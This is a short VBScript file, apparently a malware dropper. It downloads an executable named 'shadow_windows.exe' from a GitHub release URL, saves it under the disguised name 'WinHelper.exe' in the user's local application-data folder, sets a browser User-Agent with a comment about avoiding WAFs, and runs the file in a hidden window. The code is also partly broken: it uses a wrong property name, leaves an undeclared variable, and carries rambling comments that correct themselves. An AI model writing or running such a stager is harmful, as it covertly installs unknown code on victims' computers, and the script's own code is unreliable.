Option Explicit

Dim fso, ws, http, url, targetDir, targetPath, shellCmd

Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")

' 1. Define paths
targetDir = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%")
targetPath = fso.BuildPath(targetDir, "WinHelper.exe")
url = "https://github.com/Buff220/test123/releases/download/v1.0/shadow_windows.exe"

' 2. Check if file exists, if not download
If Not fso.FileExists(targetPath) Then
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    
    ' Optional: Add user agent to avoid some WAFs
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    
    If http.Send() Then
        If http.Status = 200 Then
            ' Save binary content to disk
            Set fso = CreateObject("Scripting.FileSystemObject")
            Set outFile = fso.CreateTextFile(targetPath, True, True) ' Third param: Unicode (False for ANSI, but binary usually works better with ADODB.Stream, however for small EXEs CreateTextFile often suffices if content is handled right. 
            ' Actually, CreateTextFile is bad for binary. Let's use ADODB.Stream for proper binary save.
            
            Set outFile = Nothing ' Clean up the text file object if it was created partially
            
            Dim stream
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 1 ' adTypeBinary
            stream.Open
            stream.Write http.Response_body
            stream.SaveToFile targetPath, 2 ' adSaveCreateOverWrite
            stream.Close
            Set stream = Nothing
        Else
            WScript.Echo "Download failed. HTTP Status: " & http.Status
        End If
    Else
        WScript.Echo "HTTP Request failed."
    End If
    Set http = Nothing
End If

' 3. Execute silently
' Use ws.Run with windowStyle 0 (hidden)
' The "cmd /c" is not needed, wscript will handle the execution directly
If fso.FileExists(targetPath) Then
    ws.Run """" & targetPath & """", 0, False
    ' Optional: Add a small delay to ensure the process has time to spawn before script exits
    WScript.Sleep 1000
End If
